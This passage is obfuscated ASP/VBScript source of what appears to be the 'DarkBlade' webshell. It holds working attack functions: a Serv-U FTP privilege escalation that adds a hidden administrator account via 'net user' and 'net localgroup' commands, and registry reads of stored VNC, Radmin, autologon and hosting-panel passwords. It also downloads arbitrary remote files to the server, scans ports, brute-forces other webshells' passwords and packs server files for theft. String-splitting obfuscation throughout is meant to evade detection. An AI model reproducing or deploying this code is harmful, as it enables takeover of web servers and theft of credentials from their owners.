If IsObject(xjab)Then
azchf.Attributes=azchf.Attributes+wclm
End If
If IsObject(zjhor)And ktg And IsDate(rovcg)Then
avl.ModIfyDate=rovcg
End If
tvnm(Err)
End Sub
Sub jmqbw()
If Not ydnj Then On Error Resume Next
Server.ScriptTimeOut=5000
If lqbip=""Then lqbip=gwk
If lqbip=""Then lqbip=nzax
If jksfh=""Then jksfh=wxw("DarkBlade.mdb")
If mpj=""Then mpj="fso"
ajg"File Packer/Unpacker"
echo"<center>"
sodx"100%"
abxky 1
cxaqj True
doTd"File Pack","10%"
iiit"text","lqbip",lqbip,"30%","",""
mwt"<td style=""width:50%;"">"
rycpp"qtylw","80px",""
exhpr"jixpz","FSO"
exhpr"kehl","UnFSO"
ild
echo" Pack as : "
zesc"text","jksfh",jksfh,40,""
echo"</td>"
fkv"Pack","10%"
uemp
abxky 0
doTd"Exceptional folder",""
iiit"text","nuatb",nuatb,"30%","",""
echo"<td colspan=""2"">"
echo"Exceptional file type,split with | "
zesc"text","ytusx",ytusx,40,""
echo"</td></tr>"
guenn
gbqwf
echo"<hr>"
sodx"100%"
abxky 1
cxaqj True
rtas"qtylw","vqd"
doTd"Release to","10%"
iiit"text","lqbip",lqbip,"30%","",""
mwt"<td> Mdb path : "
zesc"text","jksfh",jksfh,40,""
echo"</td>"
fkv"Unpack","10%"
gbqwf
uemp
guenn
echo"</center>"
echo"<hr>Notice: Unpacking need FSO object,all files unpacked will be under target folder,replacing same named!"
Select Case qtylw
Case"jixpz"
jzp"fso"
Case"kehl"
jzp"app"
Case"vqd"
zro()
End Select
End Sub
Function fwmal()
fwmal=pwzt(ramoi("SERVER_NAME"))
End Function
Sub jzp(mpj)
If Not ydnj Then On Error Resume Next
Dim rs,ihk,ctwz
Set rs=nfffq("Ad"+oge+"odb.R"+zui+"ecordSet")
Set nun=nfffq("Ad"+oge+"odb.Str"+chut+"eam")
Set ctwz=nfffq("ADOX.Catalog")
If InStr(jksfh,":\")<1 Then jksfh=wxw(jksfh)
bondh=zsz(jksfh,"\")
ihk=xop(jksfh)
ctwz.Create ihk
lswls(ihk)
conn.Execute("Create Table FileData(Id int IDENTITY(0,1) PRIMARY KEY CLUSTERED,strPath VarChar,binContent Image)")
ome Err
nun.Open
nun.Type=1
rs.Open"FileData",conn,3,3
bondh=Lcase(bondh)
qebjx=Replace(bondh,".mdb",".ldb")
If mpj="fso"Then
viuw lqbip,lqbip,rs,nun
Else
pdk lqbip,lqbip,rs,nun
End If
rs.Close
tbr
nun.Close
Set rs=Nothing
Set nun=Nothing
Set ctwz=Nothing
If Err Then
tvnm(Err)
Else
yln"Packing completed"
End If
End Sub
Sub viuw(lqbip,muh,rs,nun)
If Not ydnj Then On Error Resume Next
Dim rhzj,theFolder,phebk,files
If Not(xjab.FolderExists(muh))Then
yln"Folder dosen't exists or access denied!"
viwe
End If
nuatb=Lcase(nuatb)
Set theFolder=xjab.GetFolder(muh)
For Each rhzj in theFolder.Files
If Not(vsb(zsz(rhzj.name,"."),"^("&ytusx&")$") Or Lcase(rhzj.Name)=bondh Or Lcase(rhzj.Name)=qebjx)Then
rs.AddNew
rs("strPath")=Replace(rhzj.Path,lqbip&"\","",1,-1,1)
execute "nun.LoadFro"&kad&"mFile(rhzj.Path)"
rs("binContent")=nun.Read()
rs.Update
End If
Next
For Each rhzj in theFolder.SubFolders
If Not vsb(rhzj.name,"^("&nuatb&")$")Then
viuw lqbip,rhzj.Path,rs,nun
End If
Next
Set files=Nothing
Set phebk=Nothing
Set theFolder=Nothing
End Sub
Sub pdk(lqbip,muh,rs,nun)
If Not ydnj Then On Error Resume Next
Dim rhzj,theFolder,fzch
execute "Set theFolder=zjhor.NameSpac"&iptuf&"e(muh)"
For Each rhzj in theFolder.Items
If Not rhzj.IsFolder And Lcase(rhzj.Name)<>bondh And Lcase(rhzj.Name)<>qebjx And Not(vsb(zsz(rhzj.name,"."),"^("&ytusx&")$"))  Then
rs.AddNew
rs("strPath")=Replace(rhzj.Path,lqbip&"\","",1,-1,1)
execute "nun.LoadFro"&kad&"mFile(rhzj.Path)"
rs("binContent")=nun.Read()
rs.Update
End If
Next
For Each rhzj in theFolder.Items
If rhzj.IsFolder And Not vsb(rhzj.name,"^("&nuatb&")$") Then
pdk lqbip,rhzj.Path,rs,nun
End If
Next
Set theFolder=Nothing
End Sub
Function dhkcb(otrjv)
If Not ydnj Then On Error Resume Next
Dim dd,tcpo
dd=""
tcpo=Split(otrjv,csj)
For i=0 To UBound(tcpo)
If IsNumeric(tcpo(i))Then
dd=dd&ChrW(CLng(tcpo(i))-20)
Else
dd=dd&tcpo(i)
End If
Next
dhkcb=dd
End Function
Sub zro()
If Not ydnj Then On Error Resume Next
Server.ScriptTimeOut=5000
Dim rs,str,theFolder
lqbip=lqbip
lqbip=Replace(lqbip,"\\","\")
If InStr(jksfh,":\")<1 Then jksfh=wxw(jksfh)
Set rs=nfffq("Ad"+oge+"odb.R"+zui+"ecordSet")
Set nun=nfffq("Ad"+oge+"odb.Str"+chut+"eam")
ihk=xop(jksfh)
lswls(ihk)
rs.Open"FileData",conn,1,1
ome Err
nun.Open
nun.Type=1
Do Until rs.Eof
If InStr(rs("strPath"),"\")>0 Then
theFolder=lqbip&"\"&dzzx(rs("strPath"),"\",False)
Else
theFolder=lqbip
End If
If Not xjab.FolderExists(theFolder)Then
execute "xjab.Cre"&iojki&"ateFolder(theFolder)"
End If
nun.SetEos()
nun.Write rs("binContent")
execute "nun.Sa"&ffdi&"vetoFile lqbip&""\""&rs(""strPath""),2"
rs.MoveNext
Loop
rs.Close
tbr
nun.Close
Set rs=Nothing
Set nun=Nothing
If Err Then
tvnm(Err)
Else
yln"Unpacking completed"
End If
End Sub
Sub srxtf()
If Not ydnj Then On Error Resume Next
Server.ScriptTimeOut=5000
Dim theFolder
ajg("Text File Searcher/Replacer")
If lqbip=""Then
lqbip=zhyko
End If
cxaqj True
sodx"100%"
abxky 1
doTd"Keyword","20%"
lhue"geww",geww,4
echo"<td>"
rycpp"qtylw","80px",""
exhpr"fsoSearch","FSO"
exhpr"saSearch","UnFSO"
ild
echo"<br>"
jwik"jdvf",1," Regexp",""
mwt"</td>"
uemp
abxky 0
doTd"Replace as",""
lhue"irbw",irbw,4
echo"<td>"
jwik"rke",1," Replace",""
mwt"</td>"
uemp
abxky 1
doTd"Path",""
iiit"text","lqbip",lqbip,"","",""
echo"<td>"
zesc"radio","searchType","filename","",""
echo"File name "
zesc"radio","searchType","ogda","","checked"
echo"File content"
echo"</td>"
uemp
abxky 0
doTd"Search type",""
iiit"text","rhnw",mhla,"","",""
fkv"Search",""
uemp
guenn
If geww<>""Then
echo"<hr>"
yhigl
If qtylw="fsoSearch"Then
Set theFolder=xjab.GetFolder(lqbip)
Call xst(theFolder,geww)
Set theFolder=Nothing
ElseIf qtylw="saSearch"Then
Call dwq(lqbip,geww)
End If
echo"</ul>"
End If
If Err Then
tvnm(Err)
Else
yln"Search completed"
End If
viwe
End Sub
Sub xst(folder,str)
Dim ext,title,theFile,theFolder,dmy
dmy=False
If jdvf=1 Then dmy=True
For Each theFile in folder.Files
ext=Lcase(zsz(theFile.Name,"."))
If searchType="filename"Then
If dmy And vsb(theFile.Name,str)Then
ktt theFile.Path,"fso"
ElseIf InStr(1,theFile.Name,str,1) > 0 Then
ktt theFile.Path,"fso"
End If
Else
If vsb(ext,"^("&rhnw&")$")Then
If pjnc(theFile.Path,str,"fso",dmy) Then
ktt theFile.Path,"fso"
End If
End If
End If
Next
For Each theFolder in folder.subFolders
xst theFolder,str
Next
tvnm(Err)
End Sub
Function pjnc(sPath,s,method,dmy)
If Not ydnj Then On Error Resume Next
Dim theFile,content,find
find=False
If method="fso" Then
content=tpcq(sPath)
Else
content=rchgv(sPath)
End If
If Err Then
tvnm(Err)
pjnc=False
Exit Function
End If
'echo content
If dmy Then
find=vsb(content,s)
ElseIf InStr(1,content,s,1)>0 Then
find=True
End If
If Err Then Err.Clear
If rke Then
If dmy Then
content=swye(content,s,irbw,False)
Else
content=Replace(content,s,irbw,1,-1,1)
End If
If method="fso" Then
ekg sPath,content
Else
woli sPath,content,2
End If
End If
pjnc=find
tvnm(Err)
End Function
Function getPams
getPams=CStr(7924347+9234535)+dhkcb("66_126_135")
End Function
Sub dwq(lqbip,iktry)
If Not ydnj Then On Error Resume Next
Dim title,ext,phebk,tywoo,fileName,dmy
dmy=False
If jdvf=1 Then dmy=True
execute "Set phebk=zjhor.Na"&cutwa&"meSpace(lqbip)"
For Each tywoo in phebk.Items
If tywoo.IsFolder Then
Call dwq(tywoo.Path,iktry)
Else
ext=Lcase(zsz(tywoo.Path,"."))
fileName=zsz(tywoo.Path,"\")
If searchType="filename"Then
If dmy And vsb(fileName,str)Then
ktt theFile.Path,"app"
ElseIf InStr(Lcase(fileName),Lcase(str)) > 0 Then
ktt theFile.Path,"app"
End If
Else
If vsb(subExt,"^("&rhnw&")$")Then
If pjnc(tywoo.Path,iktry,"app",dmy) Then
ktt tywoo.Path,"app"
End If
End If
End If
End If
Next
tvnm(Err)
End Sub
Sub ktt(sPath,tagz)
Dim lfy
If tagz="fso"Then
lfy="veerr"
Else
lfy="jilq"
End If
echo"<li><u>"&sPath&"</u>"
injj lfy,"unu",clwc(sPath),"Edit",""
Response.Flush()
End Sub
Sub xibim()
If Not ydnj Then On Error Resume Next
Dim fpagc
fpagc="darkblade"
gtt="User "&vgm&vbCrLf
ertns="Pass "&ulz&vbCrLf
qrqg="-DE"+nevit+"LETEDOMAIN"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&" PortNo="&wtpog&vbCrLf
mt="SITE MAINTEN"+xxyht+"ANCE"&vbCrLf
zqps="-Se"+lvby+"tDOMAIN"&vbCrLf&"-Domain="&fpagc&"|0.0.0.0|"&wtpog&"|-1|1|0"&vbCrLf&"-TZOEna"+pxy+"ble=0"&vbCrLf&" TZOKey="&vbCrLf
ubql="-SetUS"+vals+"ERSetUP"&vbCrLf&"-IP=0.0.0.0"&vbCrLf&"-PortNo="&wtpog&vbCrLf&"-User="&nuser&vbCrLf&"-Password="&npass&vbCrLf&_
"-HomeDir="&nboac()&"\\"&vbCrLf&"-LoginM"+qqgwy+"esFile="&vbCrLf&"-Disable=0"&vbCrLf&"-RelPat"+uzw+"hs=1"&vbCrLf&_
"-NeedS"+qmypq+"ecure=0"&vbCrLf&"-HideHid"+wubeu+"den=0"&vbCrLf&"-Alway"+nvlq+"sAllowLogin=0"&vbCrLf&"-Chan"+kpa+"gePassword=0"&vbCrLf&_
"-Quota"+qhgjo+"Enable=0"&vbCrLf&"-MaxUsersLogin"+peznw+"PerIP=-1"&vbCrLf&"-SpeedLimit"+idtky+"Up=0"&vbCrLf&"-SpeedLimitD"+cqcd+"own=0"&vbCrLf&_
"-Ma"+aiz+"xNrUsers=-1"&vbCrLf&"-IdleTim"+ocztl+"eOut=600"&vbCrLf&"-SessionTimeOut=-1"&vbCrLf&"-Expire=0"&vbCrLf&"-RatioUp=1"&vbCrLf&_
"-RatioDown=1"&vbCrLf&"-RatiosCredit=0"&vbCrLf&"-QuotaCurrent=0"&vbCrLf&"-QuotaMaximum=0"&vbCrLf&_
"-MAINTEN"+xxyht+"ANCE=System"&vbCrLf&"-PasswordType=Regular"&vbCrLf&"-Ratios=None"&vbCrLf&" Access="&nboac()&"\\|RWA"+bagc+"MELCDP"&vbCrLf
znx="QUIT"&vbCrLf
ajg("Serv"+shn+"-U FTP Exp")
Select Case qtylw
Case "1"
rhlo
Case "2"
fumw
Case "3"
rlosg
Case "4"
iks
Case "5"
xbb
Case Else
If IsObject(Session("a"))Then Session("a").abort
If IsObject(Session("b"))Then Session("b").abort
If IsObject(Session("c"))Then Session("c").abort
Set Session("a")=Nothing
Set Session("b")=Nothing
Set Session("c")=Nothing
cxaqj True
rtas "qtylw",1
echo"<center><b>Add Temp Domain</b><br>"
sodx "80%"
abxky 1
doTd"Local user","20%"
iiit"text","vgm","LocalAdmin"+dslf+"istrator","30%","",""
doTd"Local pass","20%"
iiit"text","ulz","#l@$ak#.lk;0@P","30%","",""
uemp
abxky 0
doTd" Local port",""
iiit"text","kurmq","43"+zcek+"958","","",""
doTd"Sys drive",""
iiit"text","jqj",nboac(),"","",""
uemp
abxky 1
doTd"New user",""
iiit"text","nuser","go","","",""
doTd"New pass",""
iiit"text","npass","od","","",""
uemp
abxky 0
doTd"New port",""
iiit"text","wtpog","60000","","",""
echo"<td>"
qjr"Go"
echo"</td><td>"
zesc"reset","","ReSet","",""
echo"</td></tr>"
guenn
echo"</center>"
gbqwf
End Select
echo"<hr>"
echo"<center>"
sodx "80%"
abxky 1
echo"<td>"
injj goaction,"","","Add domain",""
echo"</td>"
echo"<td>"
injj goaction,4,"","Exec cmd",""
echo"</td>"
echo"<td>"
injj goaction,5,"","Clean domain",""
echo"</td>"
uemp
guenn
echo"</center>"
viwe
End Sub
Sub rhlo()
If Not ydnj Then On Error Resume Next
Set a=nfffq("Microsoft.XM"+swww+"LHTTP")
a.open"GET","http://127.0.0.1:"&kurmq&"/goldsun/upa"+oklv+"dmin/s1",True,"",""
a.send gtt&ertns&mt&qrqg&zqps&ubql&znx
Set Session("a")=a
yln"Connecting 127.0.0.1:"&kurmq&" using "&vgm&",pass:"&ulz&"..."
tvnm(Err)
iks
End Sub
Sub fumw()
If Not ydnj Then On Error Resume Next
iks()
Set b=nfffq("Microsoft.XM"+swww+"LHTTP")
b.open"GET","http://"&ramoi("LOCAL_ADDR")&":"&wtpog&"/goldsun/upa"+oklv+"dmin/s2",False,"",""
b.send"User "&nuser&vbCrLf&"pass "&npass&vbCrLf&"site exec "&nyf&vbCrLf&znx
Set Session("b")=b
yln"Executing com"+nhmkc+"mand..."
mwt"<hr><center><div class='alt1Span' style='width:80%;text-align:left'><br>"
mwt Replace(b.ResponseText,chr(10),"<br>")&"</div></center>"
tvnm(Err)
End Sub
Sub rlosg()
If Not ydnj Then On Error Resume Next
Set c=nfffq("Microsoft.XM"+swww+"LHTTP")
c.open "GET","http://127.0.0.1:"&kurmq&"/goldsun/upa"+oklv+"dmin/s3",True,"",""
c.send gtt&ertns&mt&qrqg&znx
Set Session("c")=c
yln"Temp domain deleted!"
echo"<script language='javascript'>setTimeout(""qjr('"&goaction&"','','')"",""3000"");</script>"
tvnm(Err)
End Sub
Function nboac()
If Not ydnj Then On Error Resume Next
nboac=Lcase(Left(xjab.GetSpecialFolder(0),2))
If nboac=""Then nboac="c:"
End Function
Sub iks()
If nuser=""Then nuser="go"
If npass=""Then npass="od"
If wtpog=""Then wtpog="60000"
cxaqj True
rtas "qtylw",2
echo"<center><b>Execute Cmd</b><br>"
sodx "80%"
abxky 1
doTd"com"+nhmkc+"mand",""
iiit"text","nyf","cmd /c net u"+rmct+"ser admin$ fuckyou /add & net localg"+ezyq+"roup administrators admin$ /add","","",3
uemp
abxky 0
doTd"Ftp user",""
iiit"text","nuser",nuser,"","",""
doTd"Ftp pass",""
iiit"text","npass",npass,"","",""
uemp
abxky 1
doTd"Ftp port",""
iiit"text","wtpog",wtpog,"","",""
echo"<td>"
qjr"Go"
echo"</td><td>"
zesc"reset","","ReSet","",""
echo"</td></tr>"
guenn
echo"</center>"
gbqwf
End Sub
Sub xbb()
cxaqj True
rtas "qtylw",3
echo"<center><b>Clean Temp Domain</b><br>"
sodx "80%"
abxky 1
doTd"Local user","20%"
iiit"text","vgm","LocalAdmin"+dslf+"istrator","30%","",""
doTd"Local pass","20%"
iiit"text","ulz","#l@$ak#.lk;0@P","30%","",""
uemp
abxky 0
doTd"Local port",""
iiit"text","kurmq","43"+zcek+"958","","",""
doTd"Temp domain port",""
iiit"text","wtpog","60000","","",""
uemp
abxky 1
echo"<td colspan='2'>"
qjr"Go"
echo"</td><td colspan='2'>"
zesc"reset","","ReSet","",""
echo"</td></tr>"
guenn
echo"</center>"
gbqwf
End Sub
Sub aum()
If Not ydnj Then On Error Resume Next
Dim theFolder
ajg"Asp Webshell Scanner"
echo"Path : "
cxaqj True
zesc"text","lqbip","/",50,""
echo" "
qjr"Scan"
jwik"glw",1," Get include files",""
If lqbip<>""Then
If InStr(lqbip,":\")<1 And Left(lqbip,2)<>"\\" Then lqbip=wxw(lqbip)
echo"<hr>"
Response.Flush()
yhigl
Set theFolder=xjab.GetFolder(lqbip)
gcaso(theFolder)
Set theFolder=Nothing
echo"</ul>"
End If
viwe
End Sub
Sub gcaso(theFolder)
If Not ydnj Then On Error Resume Next
Server.ScriptTimeOut=5000
Dim pdlm,vquvc,ext,nvkql,funcs,mrc,duvu,theFile,content,ybt
pdlm="WS"+qkdx+"cript.She"+nomr+"ll|WS"+qkdx+"cript.She"+nlrnz+"ll.1|She"+nlrnz+"ll.Applic"+oqzje+"ation|She"+nlrnz+"ll.Applic"+oqzje+"ation.1|clsid:72"+acxz+"C24DD5-D70A-438B-8A42-98"+cxly+"424B88AFB8|clsid:13"+kqzzy+"709620-C279-11CE-A49E-4445535"+euy+"40000"
vquvc="WS"+qkdx+"cript.She"+nomr+"ll;Run,Exec,RegRead|She"+nlrnz+"ll.Applic"+oqzje+"ation;ShellExe"+fopn+"cute|Scriptin"+xfw+"g.FileSystemObj"+znlfx+"ect;CreateTextFile,OpenTextFile,SavetoFile"
For Each eyr in theFolder.Files
ybt=False
mrc=False
ext=Lcase(zsz(eyr.Name,"."))
If vsb(ext,"^("&dxpm&")$") Then
content=tpcq(eyr.Path)
duvu=""
For Each xjmb in Split(pdlm,"|")
If InStr(1,content,xjmb,1)>0 Then
qean eyr,"Object with risk : <font color=""red"">"&xjmb&"</font>"
ybt=True
End If
Next
For Each strFunc in Split(vquvc,"|")
nvkql=dzzx(strFunc,";",True)
funcs=zsz(strFunc,";")
For Each subFunc in Split(funcs,",")
If vsb(content,"\."&subFunc&"\b") Then
qean eyr,"Called object <font color=""red"">"&nvkql&"'s "&subFunc&"</font> Function"
ybt=True
End If
Next
Next
If vsb(content,"Set\s*.*\s*=\s*server\s")Then
qean eyr,"Found Set xxx=Server"
ybt=True
End If
If vsb(content,"server.(execute|Transfer)([ \t]*|\()[^""]\)")Then
qean eyr,"Found <font color=""red"">Serv"+jiksj+"er.Execute / Transfer()</font> Function"
ybt=True
End If
If vsb(content,"\bLANGUAGE\s*=\s*[""]?\s*(vbscript|jscript|javascript)\.encode\b")Then
qean eyr,"<font color=""red"">Script encrypted</font>"
ybt=True
End If
If vsb(content,"<script\s*(.|\n)*?runat\s*=\s*""?server""?(.|\n)*?>")Then
qean eyr,"Found <font color=""red"">"&mszsa("<script runat=""server"">")&"</font>"
ybt=True
End If
If vsb(content,"[^\.]\bExecute\b")Then
qean eyr,"Found <font color=""red"">Execute()</font> Function"
ybt=True
End If
If vsb(content,"[^\.]\bExecuteGlobal\b")Then
qean eyr,"Found <font color=""red"">ExecuteGl"+nypem+"obal()</font> Function"
ybt=True
End If
If glw=1 Then duvu=soa(content,"<!--\s*#include\s+(file|virtual)\s*=\s*.*-->",False)(0)
If duvu<>""Then
duvu=soa(duvu,"[/\w]+\.[\w]+",False)(0)
If duvu=""Then 
qean eyr,"Can't get include file"
ybt=True
Else
qean eyr,"Included file <font color=""blue"">"&duvu&"</font>"
ybt=True
End If
End If
End If
If ybt Then
echo"<hr>"
Response.Flush()
End If
Next
For Each phebk in theFolder.SubFolders
gcaso(phebk)
Next
tvnm(Err)
End Sub
Sub qean(eyr,kqll)
mwt"<li><u>"
injj "veerr","unu",clwc(eyr.Path),eyr.Path,""
mwt"</u><font color=#9900FF>"&eyr.DateLastModIfied&"</font>-<font color=#009966>"&kxyzh(eyr.size)&"</font>-"&kqll&"</li>"
Response.Flush()
End Sub
Sub nvkq()
If Not ydnj Then On Error Resume Next
If lqbip=""Then lqbip=nzax
Dim mrpwl,yoc
yoc=aiw
mrpwl=wannd
If yoc=""Then yoc=Replace("HK"+xoncv+"LM\SYSTEM\Curre"+fewse+"ntControlSet\Control\ComputerNa"+wwva+"me\ComputerNa"+wwva+"me\ComputerNa"+wwva+"me|HK"+xoncv+"LM\SOFTW"+wjw+"ARE\Microsoft\Window"+zfd+"s NT\Curren"+suctf+"tVersion\Winlog"+sdxq+"on\AutoAdmin"+itn+"Logon|HK"+xoncv+"LM\SOFTW"+wjw+"ARE\Microsoft\Window"+zfd+"s NT\Curren"+suctf+"tVersion\Winlog"+sdxq+"on\Def"+lvgli+"aultUserName|HK"+xoncv+"LM\SOFTW"+wjw+"ARE\Microsoft\Window"+zfd+"s NT\Curren"+suctf+"tVersion\Winlog"+sdxq+"on\Defaul"+zhisp+"tPassword|HK"+xoncv+"LM\SYSTEM\Curre"+fewse+"ntControlSet\Services\MySQL\ImagePath|HK"+xoncv+"LM\SYSTEM\Curre"+fewse+"ntControlSet\Services\Serv"+shn+"-U-Counters\Performance\Library|HK"+xoncv+"LM\SYSTEM\Curre"+fewse+"ntControlSet\Services\Serv"+shn+"-U\ImagePath|HK"+xoncv+"LM\SOFTW"+wjw+"ARE\Cat Soft\Serv"+shn+"-U\Domains\DomainList\DomainList|HK"+xoncv+"LM\SYSTEM\Ra"+aumws+"dmin\v2.0\Server\Parameters\Parameter|HK"+xoncv+"LM\SYSTEM\Ra"+aumws+"dmin\v2.0\Server\Parameters\Port|HK"+xoncv+"LM\SYSTEM\Ra"+aumws+"dmin\v2.0\Server\Parameters\NT"+tpb+"AuThenabled|HK"+xoncv+"LM\SYSTEM\Ra"+aumws+"dmin\v2.0\Server\Parameters\Fil"+qrby+"terIp|HK"+xoncv+"LM\SYSTEM\Ra"+aumws+"dmin\v2.0\Server\iplist\0|HK"+xoncv+"LM\SOFTW"+wjw+"ARE\ORL\WinVNC3\default\Password|HK"+xoncv+"LM\SOFTW"+wjw+"ARE\RealVNC\WinVNC4\Password|HK"+xoncv+"LM\SOFTW"+wjw+"ARE\hzhost\config\Settings\mysqlpass|HK"+xoncv+"LM\SOFTW"+wjw+"ARE\hzhost\config\Settings\mastersvrpass|HK"+xoncv+"LM\SOFTW"+wjw+"ARE\hzhost\config\Settings\sysdbpss","|",vbCrLf)
If mrpwl=""Then mrpwl=Replace("x:\|x:\Program Files|x:\Program Files\Serv"+shn+"-U|x:\Program Files\RhinoSoft.com|x:\Program Files\Ra"+aumws+"dmin|x:\Program Files\Mysql|x:\Program Files\mail|x:\Program Files\winwebmail|x:\documents and Settings\All Users|x:\documents and Settings\All Users\documents|x:\documents and Settings\All Users\Start Menu\Programs|x:\documents and Settings\All Users\Application Data\Symantec\pcAnywhere|x:\Serv"+shn+"-U|x:\Ra"+aumws+"dmin|x:\Mysql|x:\mail|x:\winwebmail|x:\soft|x:\tools|x:\windows\temp","|",vbCrLf)
ajg"Action Others"
cxaqj True
rtas"qtylw","fgcb"
mwt"<b>Download to server</b><br>"
sodx"100%"
abxky 1
iiit"text","sesq","http://","80%","",""
fkv"Download","20%"
uemp
abxky 0
iiit"text","lqbip",lqbip,"","",""
echo"<td>"
jwik"overWri",2,"Overwrite",""
uemp
guenn
gbqwf
echo"<hr>"
cxaqj True
rtas"qtylw","grl"
mwt"<b>Port scan</b><br>"
sodx"100%"
abxky 1
doTd"Scan IP","20%"
iiit"text","czwfq","127.0.0.1","60%","",""
fkv"Scan","20%"
uemp
abxky 0
doTd"Port List","20%"
iiit"text","ugxyt","21,23,80,1433,1521,3306,3389,4899,43"+zcek+"958,65500","80%","",2
uemp
guenn
gbqwf
echo"<hr>"
cxaqj True
rtas"qtylw","axt"
mwt"<b>Tiny shell crack</b><br>"
sodx"100%"
abxky 1
doTd"Url","20%"
iiit"text","sesq","http://","60%","",""
fkv"Start","20%"
uemp
abxky 0
doTd"Dic","20%"
iiit"text","pnu","value,cmd,admin,fuck,fuckyou,go,123456,#,|,a,b,c,d,e,f,g,h,i,j,k,l,m,n,o,p,q,r,s,t,u,v,w,x,y,z,~,!,@,*,$,1,2,3,4,5,6,7,8,9,0","","",""
echo"<td>"
rycpp"ccnh","60px",""
exhpr"asp","asp"
exhpr"php","php"
ild
echo"</td>"
uemp
guenn
gbqwf
echo"<hr>"
echo"<form method=""post"" id=""form"&ujcmu&""" action="""&cngn&""" onSubmit=""javascript:yfmde(this)"">"
ujcmu=ujcmu+1
rtas"goaction","jilq"
rtas"qtylw","unu"
mwt"<b>Stream edit</b><br>"
sodx"100%"
abxky 1
doTd"Path","20%"
iiit"text","lqbip",nzax,"60%","",""
fkv"Start","20%"
uemp
guenn
gbqwf
echo"<hr>"
cxaqj True
rtas"qtylw","ieqhv"
mwt"<b>Common path Detection</b><br>"
sodx"100%"
abxky 1
lhue"wannd",mrpwl,6
fkv"Start","20%"
uemp
guenn
gbqwf
echo"<hr>"
cxaqj True
sodx"100%"
rtas"qtylw","lcos"
mwt"<b>Registry Detection</b><br>"
sodx"100%"
abxky 1
lhue"aiw",yoc,6
fkv"Start","20%"
uemp
guenn
gbqwf
echo"<hr>"
Select Case qtylw
Case"fgcb"
echo"<hr>"
baf()
Case"lcos"
echo"<hr>"
taerr()
Case"grl"
echo"<hr>"
vny()
Case"axt"
echo"<hr>"
qddd()
Case"ieqhv"
echo"<hr>"
nzbv()
End Select
End Sub
Sub baf()
If Not ydnj Then On Error Resume Next
Dim gfst,ertms
Set nun=nfffq("Ad"+oge+"odb.Str"+chut+"eam")
gfst=zsz(sesq,"/")
If InStr(lqbip,".")<1 Then lqbip=lqbip&"\"&gfst
iuwq.Open"GET",sesq,False
iuwq.send
ome(Err)
If overWri<>2 Then
overWri=1
End If
With nun
.Type=1
.Mode=3
.Open
.Write iuwq.ResponseBody
.Position=0
execute "nun.Sa"&uyl&"vetoFile lqbip,overWri"
.Close
End With
If Err Then
tvnm(Err)
Else
echo"Download succeeded"
End If
End Sub
Sub taerr()
If Not ydnj Then On Error Resume Next
Dim tftr
echo"Registry key detected will be shown below:<br>"
sodx "100%"
ads=1
vhl
doTd"<b>Key</b>",""
doTd"<b>Value</b>",""
uemp
For Each muh in Split(aiw,Chr(10))
muh=Replace(muh,Chr(13),"")
tftr=knf(muh)
If tftr<>"" Then
abxky ads
doTd muh,""
doTd tftr,""
uemp
nrf
End If
Next
guenn
If Err Then
tvnm(Err)
End If
End Sub
Function knf(rpath)
Dim daxgr,tftr
If Not ydnj Then On Error Resume Next
execute "daxgr=vnznl.RegR"&ddrpj&"ead(rpath)"
If IsArray(daxgr)Then
tftr=""
For i=0 To UBound(daxgr)
If IsNumeric(daxgr(i))Then
If CInt(daxgr(i))<16 Then
tftr=tftr&"0"
End If
tftr=tftr&CStr(Hex(CInt(daxgr(i))))
Else
tftr=tftr&daxgr(i)
End If
Next
knf=tftr
Else
knf=daxgr
End If
End Function
Sub vny()
If Not ydnj Then On Error Resume Next
If Not pwzt(czwfq)Then
yln "Invalid IP format"
viwe
End If
If Not vsb(ugxyt,"^(\d{1,5},)*\d{1,5}$")Then
echo "Invalid port format"
viwe
End If
echo "Scanning...<br>"
Response.Flush()
For Each tmpip in Split(czwfq,",")
For Each tmpPort in Split(ugxyt,",")
toqvj tmpip,tmpPort
Next
Next
End Sub
Sub toqvj(patae,pfj)
On Error Resume Next
Dim conn,ihk
Set conn=nfffq("Ad"+oge+"odb.Connecti"+wehbe+"on")
ihk="Provider=SQLOLEDB.1;Data Source="&patae&","&pfj&";User ID=lake2;Password=lake2;"
conn.ConnectionTimeout=1
conn.open ihk
If Err Then
If Err.number=-2147217843 or Err.number=-2147467259 Then
If InStr(Err.description,"(Connect()).")>0 Then
echo"<label>"&patae&":"&pfj&"</label><label>close</label><br>"
Else
echo"<label>"&patae&":"&pfj&"</label><label><font color=red>open</font></label><br>"
End If
Response.Flush()
End If
End If
End Sub
Sub qddd()
If Not ydnj Then On Error Resume Next
echo"Cracking...<br>"
Response.Flush()
For Each strPass in Split(pnu,",")
If ccnh="asp"Then
strpam=nwtcn(strPass)&"="&nwtcn("response.write 98611")
Else
strpam=nwtcn(strPass)&"="&nwtcn("echo 98611;")
End If
If InStr(rvi(sesq&"?"&strpam,"POST"),"98611")>0 Then
echo"Password is <font color=red>"&strPass&"</font> ^_^"
viwe
End If
Next
echo"Crack failed,RPWT?"
tvnm(Err)
End Sub
Sub nzbv()
If Not ydnj Then On Error Resume Next
Dim vhyzu,xad
echo"Path detected will be shown below:<br>"
wannd=Replace(wannd,"x:\","")
xad=1
For Each drive in xjab.Drives
For Each muh in Split(wannd,vbCrLf)
execute "vhyzu=drive.DriveL"&uocpb&"etter&"":\""&muh"
If xjab.FolderExists(vhyzu)Then
gfk xad
injj "veerr","",clwc(vhyzu),vhyzu,""
echo"</span>"
xad=xad+1
If xad=2 Then xad=0
vldnv.MoveNext
Response.Flush()
End If
Next
Next
tvnm(Err)
End Sub
Sub mddep()
Response.Cookies(fjjxv)=""
Response.Cookies(wseta&"ihk")=""
Response.Cookies(fjjxv).expires=Now
Response.Cookies(wseta&"ihk").expires=Now
Response.Redirect(cngn&"?goaction="&amb)
End Sub
Sub ajg(porw)
%>
<html>
<head>
<title><%=mvvi%></title>
<style type="text/css">
body,td{font: 12px Arial,Tahoma;line-height: 16px;}
.main{width:100%;padding:20px 20px 20px 20px;}
.hidehref{font:12px Arial,Tahoma;color:#646464;}
.showhref{font:12px Arial,Tahoma;color:#0099FF;}
.input{font:12px Arial,Tahoma;background:#fff;height:20px;BORDER-WIDTH:1px;}
.text{font:12px Arial,Tahoma;background:#fff;padding:1px;BORDER-WIDTH:1px;}
.tdInput{font:12px Arial,Tahoma;background:#fff;padding:1px;height:20px;width:100%;BORDER-WIDTH:1px;}
.tdText{font:12px Arial,Tahoma;background:#fff;padding:1px;width:100%;BORDER-WIDTH:1px;}
.area{font:12px 'Courier New',Monospace;background:#fff;border: 1px solid #666;padding:2px;}
